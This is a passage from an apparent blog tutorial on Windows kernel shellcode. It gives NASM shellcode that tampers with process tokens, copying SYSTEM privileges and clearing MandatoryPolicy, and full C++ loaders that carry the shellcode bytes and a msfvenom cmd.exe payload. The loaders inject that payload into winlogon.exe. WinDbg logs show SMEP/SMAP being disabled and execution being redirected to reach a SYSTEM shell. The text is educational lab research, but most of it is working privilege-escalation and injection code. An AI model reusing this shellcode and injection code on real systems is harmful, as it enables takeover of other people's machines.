   +0x0b8 DefaultDacl      : 0xffffdd83`2eac757c _ACL
   +0x0c0 TokenType        : 1 ( TokenPrimary )
   +0x0c4 ImpersonationLevel : 0 ( SecurityAnonymous )
   +0x0c8 TokenFlags       : 0x4a00
   +0x0cc TokenInUse       : 0x1 ''
   +0x0d0 IntegrityLevelIndex : 1
   +0x0d4 MandatoryPolicy  : 1
...
```

```nasm
...
	mov rcx, [rcx+0x4b8]						; get the exploit process' _TOKEN structure
	and rcx, 0xfffffffffffffff0					; get the pointer to the object and not the fast reference
	mov byte [rcx + 0x0d4], 0x0					; set MandatoryPolicy to 0 (open handle to any process besides the privilege)

	nop
	ret

end
```
Now `MandatoryPolicy` = 0

Now let’s load the shellcode. We’ve modified our `ProcessInjection` program and extracted the shellcode via `HxD`.
![](imgs/blog/1WindowsKernelShellcode/20250222013712.png)

![](imgs/blog/1WindowsKernelShellcode/20250222013736.png)

```cpp
#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#include <ktmw32.h>

#pragma comment(lib,"KtmW32.lib")

// buffer que vamos a asignar para que el kernel lo ejecute
char KernelShellcode[] = {
	0x90, 0x65, 0x4C, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 
	0x4D, 0x8B, 0x80, 0x20, 0x02, 0x00, 0x00, 0x4C, 0x89, 0xC1, 
	0x4D, 0x8B, 0x80, 0x48, 0x04, 0x00, 0x00, 0x49, 0x81, 0xE8, 
	0x48, 0x04, 0x00, 0x00, 0x41, 0x81, 0xB8, 0xA8, 0x05, 0x00, 
	0x00, 0x77, 0x69, 0x6E, 0x6C, 0x75, 0xE5, 0x49, 0x83, 0xE8, 
	0x30, 0x4D, 0x8B, 0x40, 0x28, 0x49, 0x83, 0xE0, 0xF0, 0x41, 
	0xC6, 0x40, 0x48, 0x0B, 0x48, 0x8B, 0x89, 0xB8, 0x04, 0x00, 
	0x00, 0x48, 0x83, 0xE1, 0xF0, 0xC6, 0x81, 0xD4, 0x00, 0x00, 
	0x00, 0x00, 0x90, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};


// 280 bytes
// EXITFUNC=thread
// msfvenom -p windows/x64/exec CMD=cmd.exe -f raw EXITFUNC=thread
unsigned char pPayload[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00,
	0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2,
	0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48,
	0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7,
	0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C,
	0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52,
	0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
	0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01,
	0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49,
	0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34,
	0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0,
	0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1,
	0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0,
	0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,
	0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41,
	0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0,
	0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF,
	0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00,
	0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xE0,
	0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80,
	0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A,
	0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x6D, 0x64,
	0x2E, 0x65, 0x78, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

bool ProcessEnum(const wchar_t* wcProcess, DWORD* ProcId) {

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnapshot == INVALID_HANDLE_VALUE) {
		printf("\n[ERROR GETTING \"hSnapshot\"] -> %d\n", GetLastError());
		return false;
	}

	PROCESSENTRY32W ProcEntry = { 0 };

	ProcEntry.dwSize = sizeof(PROCESSENTRY32W);

	if (!Process32FirstW(hSnapshot, &ProcEntry)) {
		printf("\n[ERROR at \"Process32FirstW\"] -> %d\n", GetLastError());
		return false;
	}

	do {

		if (lstrcmpW(ProcEntry.szExeFile, wcProcess) == 0) {
			wprintf(L"\n[+] Process found -> \"%s\"\n\t\\__PID -> %d\n", ProcEntry.szExeFile, ProcEntry.th32ProcessID);
			*ProcId = ProcEntry.th32ProcessID;
			break;
		}

	} while (Process32NextW(hSnapshot, &ProcEntry));


	return true;
}

bool RemoteInjection(DWORD dwPid) {

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, dwPid);
	if (hProcess == INVALID_HANDLE_VALUE) {
		printf("\n[ERROR CREATING THE HANDLE TO THE PROCESS] -> %d\n", GetLastError());
		return false;
	}
	printf("\n[HANDLE]\n");

	PVOID pRemoteAddress = VirtualAllocEx(hProcess, nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (pRemoteAddress == nullptr) {
		printf("\n[ERROR ALLOCATING THE REMOTE BUFFER] -> %d\n", GetLastError());
		return false;
	}
	printf("\n[BUFFER]\n");

	SIZE_T BytesWritten = 0;

	if (!WriteProcessMemory(hProcess, pRemoteAddress, pPayload, 280, nullptr)) {
		printf("\n[ERROR WRITTING THE SHELLCODE INTO THE REMOTE BUFFER] -> %d\n", GetLastError());
		return false;
	}
	printf("\n[SHELLCODE]\n");

	HANDLE CreateThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)pRemoteAddress, nullptr, 0, nullptr);

	if (CreateThread == INVALID_HANDLE_VALUE) {
		printf("\n[ERROR CREATING THE REMOTE THREAD] -> %d\n", GetLastError());
		return false;
	}

	WaitForSingleObject(CreateThread, INFINITE);

	VirtualFreeEx(hProcess, pRemoteAddress, 0x1000, MEM_RELEASE);

	CloseHandle(hProcess);
	CloseHandle(CreateThread);

	return true;
}


int main() {

	printf("\nAllocating Kernel Shellcode...\n");

	// asignamos el espacio
	PVOID pShellcode = VirtualAlloc(nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	RtlSecureZeroMemory(pShellcode, 0x1000);

	memcpy(pShellcode, KernelShellcode, 90);

	VirtualLock(pShellcode, 0x1000);

	printf("\n[SHELLCODE ADDRESS] 0x%p\n", pShellcode);
	printf("\nPress <ENTER> to trigger NtCreateTransaction syscall\n");
	getchar();

	CreateTransaction(NULL, 0, 0, 0, 0, 0, NULL);

	const wchar_t* wcProcess = L"winlogon.exe";
	DWORD dwPid = 0;

	wprintf(L"\nPress <ENTER> to inject shellcode (cmd.exe) into %s process\n", wcProcess);
	getchar();

	if (!ProcessEnum(wcProcess, &dwPid)) {
		printf("\n[main] error enumerating processes\n");
		return 1;
	}

	if (!RemoteInjection(dwPid)) {
		printf("\n[main] error executing the remote process\n");
		return 1;
	}


	return 0;
}
```

We run it on the target OS:

![](imgs/blog/1WindowsKernelShellcode/20250222013847.png)
We set a BP on NtCreateTransaction, inspect the shellcode buffer, disable SMAP and SMEP, set rip, step over, set a BP on the shellcode’s ret, continue with g, reset rip, and continue:
```python
nt!DbgBreakPointWithStatus:
fffff801`208203e0 cc              int     3
0: kd> bp nt!NtCreateTransaction
0: kd> bl
     0 e Disable Clear  fffff801`207d2490     0001 (0001) nt!NtCreateTransaction

0: kd> g
Breakpoint 0 hit
nt!NtCreateTransaction:
fffff801`207d2490 4c8b15f90fd7ff  mov     r10,qword ptr [nt!_imp_NtCreateTransaction (fffff801`20543490)]
4: kd> db 280386e0000
00000280`386e0000  90 65 4c 8b 04 25 88 01-00 00 4d 8b 80 20 02 00  .eL..%....M.. ..
00000280`386e0010  00 4c 89 c1 4d 8b 80 48-04 00 00 49 81 e8 48 04  .L..M..H...I..H.
00000280`386e0020  00 00 41 81 b8 a8 05 00-00 77 69 6e 6c 75 e5 49  ..A......winlu.I
00000280`386e0030  83 e8 30 4d 8b 40 28 49-83 e0 f0 41 c6 40 48 0b  ..0M.@(I...A.@H.
00000280`386e0040  48 8b 89 b8 04 00 00 48-83 e1 f0 c6 81 d4 00 00  H......H........
00000280`386e0050  00 00 90 c3 00 00 00 00-00 00 00 00 00 00 00 00  ................
00000280`386e0060  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
00000280`386e0070  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
4: kd> u 280386e0000 L20
00000280`386e0000 90              nop
00000280`386e0001 654c8b042588010000 mov   r8,qword ptr gs:[188h]
00000280`386e000a 4d8b8020020000  mov     r8,qword ptr [r8+220h]
00000280`386e0011 4c89c1          mov     rcx,r8
00000280`386e0014 4d8b8048040000  mov     r8,qword ptr [r8+448h]
00000280`386e001b 4981e848040000  sub     r8,448h
00000280`386e0022 4181b8a805000077696e6c cmp dword ptr [r8+5A8h],6C6E6977h
00000280`386e002d 75e5            jne     00000280`386e0014
00000280`386e002f 4983e830        sub     r8,30h
00000280`386e0033 4d8b4028        mov     r8,qword ptr [r8+28h]
00000280`386e0037 4983e0f0        and     r8,0FFFFFFFFFFFFFFF0h
00000280`386e003b 41c640480b      mov     byte ptr [r8+48h],0Bh
00000280`386e0040 488b89b8040000  mov     rcx,qword ptr [rcx+4B8h]
00000280`386e0047 4883e1f0        and     rcx,0FFFFFFFFFFFFFFF0h
00000280`386e004b c681d400000000  mov     byte ptr [rcx+0D4h],0
00000280`386e0052 90              nop
00000280`386e0053 c3              ret
00000280`386e0054 0000            add     byte ptr [rax],al
00000280`386e0056 0000            add     byte ptr [rax],al
00000280`386e0058 0000            add     byte ptr [rax],al
00000280`386e005a 0000            add     byte ptr [rax],al
00000280`386e005c 0000            add     byte ptr [rax],al
00000280`386e005e 0000            add     byte ptr [rax],al
00000280`386e0060 0000            add     byte ptr [rax],al
00000280`386e0062 0000            add     byte ptr [rax],al
00000280`386e0064 0000            add     byte ptr [rax],al
00000280`386e0066 0000            add     byte ptr [rax],al
00000280`386e0068 0000            add     byte ptr [rax],al
00000280`386e006a 0000            add     byte ptr [rax],al
00000280`386e006c 0000            add     byte ptr [rax],al
00000280`386e006e 0000            add     byte ptr [rax],al
00000280`386e0070 0000            add     byte ptr [rax],al
4: kd> .formats cr4
Evaluate expression:
  Hex:     00000000`00b50ef8
  Decimal: 11865848
  Decimal (unsigned) : 11865848
  Octal:   0000000000000055207370
  Binary:  00000000 00000000 00000000 00000000 00000000 10110101 00001110 11111000
  Chars:   ........
  Time:    Mon May 18 10:04:08 1970
  Float:   low 1.66276e-038 high 0
  Double:  5.86251e-317
4: kd> r cr4=850EF8
4: kd> r cr4
cr4=0000000000850ef8
4: kd> .formats cr4
Evaluate expression:
  Hex:     00000000`00850ef8
  Decimal: 8720120
  Decimal (unsigned) : 8720120
  Octal:   0000000000000041207370
  Binary:  00000000 00000000 00000000 00000000 00000000 10000101 00001110 11111000
  Chars:   ........
  Time:    Sun Apr 12 00:15:20 1970
  Float:   low 1.22195e-038 high 0
  Double:  4.30831e-317
4: kd> r rip
rip=fffff801207d2490
4: kd> r rip=00000280386e0000
4: kd> r rip
rip=00000280386e0000
4: kd> p
00000280`386e0001 654c8b042588010000 mov   r8,qword ptr gs:[188h]
4: kd> bp 00000280`386e0053
4: kd> g
Breakpoint 1 hit
00000280`386e0053 c3              ret
4: kd> bc 0,1
4: kd> bl

4: kd> r rip=fffff801207d2490
4: kd> r rip
rip=fffff801207d2490
4: kd> g
```

![](imgs/blog/1WindowsKernelShellcode/20250222012828.png)



## Privilege Manipulation Shellcode
The last shellcode we're going to program is about privilege manipulation, based on the `_TOKEN` structure, which has a substructure called `SEP_TOKEN_PRIVILEGES` at offset `0x40`.

The idea is:
- Get the `cmd.exe` `_EPROCESS`
- Give it full privileges

The execution is as follows (suggested by me through trial and error):
- Get `_EPROCESS` of `cmd.exe` by iterating with PPID
- Get `_EPROCESS` of the `system` process
    - Inspect the `system` `_TOKEN`
    - Get the `Present` qword from the `_SEP_TOKEN_PRIVILEGES` substructure within `_TOKEN`
- Get the `_TOKEN` of `cmd.exe`
    - Paste the `Present` qword from `system` into both `Present` and `Enabled` of `cmd.exe`
- Run the program that creates a remote thread in `winlogon.exe`
- SYSTEM shell

![](imgs/blog/1WindowsKernelShellcode/20250222183057.png)

![](imgs/blog/1WindowsKernelShellcode/20250222191753.png)
The structure we care about is ``_SEP_TOKEN_PRIVILEGES``.

![](imgs/blog/1WindowsKernelShellcode/20250222191812.png)
```python
0: kd> dt nt!_SEP_TOKEN_PRIVILEGES ((poi(ffff800e70e5e080+0x4b8) & 0xfffffffffffffff0) + 0x40)
   +0x000 Present          : 0x00000006`02880000
   +0x008 Enabled          : 0x800000
   +0x010 EnabledByDefault : 0x40800000
```

![](imgs/blog/1WindowsKernelShellcode/20250222192108.png)

![](imgs/blog/1WindowsKernelShellcode/20250222192447.png)
We pass all three values, `Present`, `Enabled`, and `EnabledByDefault` from the `system` substructure and paste them into `cmd.exe`.

Let’s verify the privileges:
![](imgs/blog/1WindowsKernelShellcode/20250222192508.png)
We have them all. Now if we run `ProcessInjection.exe` into **`winlogon.exe`**, it will result in:

![](imgs/blog/1WindowsKernelShellcode/20250222192750.png)

The shellcode would be the following:
```nasm
BITS 64
section .text

	nop

	mov r8, qword [gs:0x188]
	mov r8, qword [r8 + 0x220]
	mov r10, r8											; get two _EPROCESS' start addresses (one for cmd and the other for system)
	mov r9, qword [r8 + 0x540]							; get the cmd.exe PID (InheritedFromUniqueProcessId)
	
	GetSystemLoop:
		mov r10, qword [r10 + 0x448]					; go to the flink
		sub r10, 0x448									; go to the _EPROCESS' startpoint
		cmp qword [r10 + 0x440], 0x04					; compare the UniqueProcessId with 4 (system PID)
		jne GetSystemLoop

	mov r10, [r10 + 0x4b8]								; get the system process _TOKEN structure
	and r10, 0xfffffffffffffff0							; get the pointer to the object and not to the fast reference pointer

	GetCmdLoop:
		mov r8, qword [r8+0x448]						; go to the flink
		sub r8, 0x448									; go to the _EPROCESS' startpoint
		cmp qword [r8 + 0x440], r9						; compare the UniqueProcessId cmd.exe's PID
		jne GetCmdLoop

	mov r8, [r8 + 0x4b8]								; get the system process _TOKEN structure
	and r8, 0xfffffffffffffff0							; get the pointer to the object and not to the fast reference pointer

	mov r9, qword [r10 + 0x40]			; move the Present parameter from _SEP_TOKEN_PRIVILEGES system process substructure to the same at cmd.exe
	mov qword [r8 + 0x40], r9
	mov r9, qword [r10 + 0x48]			; move the Enabled parameter from _SEP_TOKEN_PRIVILEGES system process substructure to the same at cmd.exe
	mov qword [r8 + 0x48], r9
	mov r9, qword [r10 + 0x50]			; move the EnabledByDefault parameter from _SEP_TOKEN_PRIVILEGES system process substructure to the same at cmd.exe
	mov qword [r8 + 0x50], r9

	ret

end
```
This shellcode does the following:
1. Gets the kernel's `_KTHREAD` structure
2. Gets the `_EPROCESS` from `_KTHREAD`
3. Saves a copy of `_EPROCESS`
4. Stores the thread's PPID (`cmd.exe`, where our exploit is running) in **`r9`**
5. Loops to get `system`’s `_EPROCESS` by comparing PID with 4
6. Gets the `system` `_TOKEN`, clearing the last 4 bits to get the object pointer instead of the fast reference
7. Loops to get `cmd.exe`’s `_EPROCESS` by comparing with **`r9`**
8. Gets `cmd.exe`’s `_TOKEN`, same masking
9. Transfers the three values: `Present`, `Enabled`, and `EnabledByDefault` from `system` to `cmd.exe`
10. Returns

Now as always, we compile with `nasm.exe` and view the disassembly with `ndisasm.exe`

![](imgs/blog/1WindowsKernelShellcode/20250223151220.png)

Then we paste it into ``HxD`` to extract the shellcode and load it into our program:

```cpp
#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#include <ktmw32.h>

#pragma comment(lib,"KtmW32.lib")

// buffer que vamos a asignar para que el kernel lo ejecute
char KernelShellcode[] = {
	0x90, 0x65, 0x4C, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 
	0x4D, 0x8B, 0x80, 0x20, 0x02, 0x00, 0x00, 0x4D, 0x89, 0xC2, 
	0x4D, 0x8B, 0x88, 0x40, 0x05, 0x00, 0x00, 0x4D, 0x8B, 0x92, 
	0x48, 0x04, 0x00, 0x00, 0x49, 0x81, 0xEA, 0x48, 0x04, 0x00, 
	0x00, 0x49, 0x83, 0xBA, 0x40, 0x04, 0x00, 0x00, 0x04, 0x75, 
	0xE8, 0x4D, 0x8B, 0x92, 0xB8, 0x04, 0x00, 0x00, 0x49, 0x83, 
	0xE2, 0xF0, 0x4D, 0x8B, 0x80, 0x48, 0x04, 0x00, 0x00, 0x49, 
	0x81, 0xE8, 0x48, 0x04, 0x00, 0x00, 0x4D, 0x39, 0x88, 0x40, 
	0x04, 0x00, 0x00, 0x75, 0xE9, 0x4D, 0x8B, 0x80, 0xB8, 0x04, 
	0x00, 0x00, 0x49, 0x83, 0xE0, 0xF0, 0x4D, 0x8B, 0x4A, 0x40, 
	0x4D, 0x89, 0x48, 0x40, 0x4D, 0x8B, 0x4A, 0x48, 0x4D, 0x89, 
	0x48, 0x48, 0x4D, 0x8B, 0x4A, 0x50, 0x4D, 0x89, 0x48, 0x50, 
	0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};


// 280 bytes
// EXITFUNC=thread
// msfvenom -p windows/x64/exec CMD=cmd.exe -f raw EXITFUNC=thread
unsigned char pPayload[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00,
	0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2,
	0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48,
	0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7,
	0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C,
	0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52,
	0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
	0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01,
	0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49,
	0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34,
	0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0,
	0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1,
	0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0,
	0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,
	0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41,
	0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0,
	0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF,
	0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00,
	0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xE0,
	0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80,
	0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A,
	0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x6D, 0x64,
	0x2E, 0x65, 0x78, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

bool ProcessEnum(const wchar_t* wcProcess, DWORD* ProcId) {

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnapshot == INVALID_HANDLE_VALUE) {
		printf("\n[ERROR GETTING \"hSnapshot\"] -> %d\n", GetLastError());
		return false;
	}

	PROCESSENTRY32W ProcEntry = { 0 };

	ProcEntry.dwSize = sizeof(PROCESSENTRY32W);

	if (!Process32FirstW(hSnapshot, &ProcEntry)) {
		printf("\n[ERROR at \"Process32FirstW\"] -> %d\n", GetLastError());
		return false;
	}

	do {

		if (lstrcmpW(ProcEntry.szExeFile, wcProcess) == 0) {
			wprintf(L"\n[+] Process found -> \"%s\"\n\t\\__PID -> %d\n", ProcEntry.szExeFile, ProcEntry.th32ProcessID);
			*ProcId = ProcEntry.th32ProcessID;
			break;
		}

	} while (Process32NextW(hSnapshot, &ProcEntry));


	return true;
}

bool RemoteInjection(DWORD dwPid) {

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, dwPid);
	if (hProcess == INVALID_HANDLE_VALUE) {
		printf("\n[ERROR CREATING THE HANDLE TO THE PROCESS] -> %d\n", GetLastError());
		return false;
	}
	printf("\n[HANDLE]\n");

	PVOID pRemoteAddress = VirtualAllocEx(hProcess, nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (pRemoteAddress == nullptr) {
		printf("\n[ERROR ALLOCATING THE REMOTE BUFFER] -> %d\n", GetLastError());
		return false;
	}
	printf("\n[BUFFER]\n");

	SIZE_T BytesWritten = 0;

	if (!WriteProcessMemory(hProcess, pRemoteAddress, pPayload, 280, nullptr)) {
		printf("\n[ERROR WRITTING THE SHELLCODE INTO THE REMOTE BUFFER] -> %d\n", GetLastError());
		return false;
	}
	printf("\n[SHELLCODE]\n");

	HANDLE CreateThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)pRemoteAddress, nullptr, 0, nullptr);

	if (CreateThread == INVALID_HANDLE_VALUE) {
		printf("\n[ERROR CREATING THE REMOTE THREAD] -> %d\n", GetLastError());
		return false;
	}

	WaitForSingleObject(CreateThread, INFINITE);

	VirtualFreeEx(hProcess, pRemoteAddress, 0x1000, MEM_RELEASE);

	CloseHandle(hProcess);
	CloseHandle(CreateThread);

	return true;
}


int main() {

	printf("\nAllocating Kernel Shellcode...\n");

	// asignamos el espacio
	PVOID pShellcode = VirtualAlloc(nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	RtlSecureZeroMemory(pShellcode, 0x1000);

	memcpy(pShellcode, KernelShellcode, 130);

	VirtualLock(pShellcode, 0x1000);

	printf("\n[SHELLCODE ADDRESS] 0x%p\n", pShellcode);
	printf("\nPress <ENTER> to trigger NtCreateTransaction syscall\n");
	getchar();

	CreateTransaction(NULL, 0, 0, 0, 0, 0, NULL);

	const wchar_t* wcProcess = L"winlogon.exe";
	DWORD dwPid = 0;

	wprintf(L"\nPress <ENTER> to inject shellcode (winlogon.exe) into %s process\n", wcProcess);
	getchar();

	if (!ProcessEnum(wcProcess, &dwPid)) {
		printf("\n[main] error enumerating processes\n");
		return 1;
	}

	if (!RemoteInjection(dwPid)) {
		printf("\n[main] error executing the remote process\n");
		return 1;
	}


	return 0;
}
```

As always...
![](imgs/blog/1WindowsKernelShellcode/20250223151600.png)
we set a breakpoint on `NtCreateTransaction` and trigger it with our program. Once it stops, we check the user shellcode buffer.

then we disable **SMEP** and **SMAP**, and change the **`rip`** position
![](imgs/blog/1WindowsKernelShellcode/20250223151807.png)

now we set a ``bp`` on the ``ret`` instruction of the shellcode
![](imgs/blog/1WindowsKernelShellcode/20250223151853.png)
we reposition **`rip`** and that should do it

![](imgs/blog/1WindowsKernelShellcode/20250222210132.png)
the first execution fails at first glance, however, if we check the privileges we have...

![](imgs/blog/1WindowsKernelShellcode/20250222210215.png)

and if we run the program again:
![](imgs/blog/1WindowsKernelShellcode/20250222210044.png)
we successfully get a shell as system
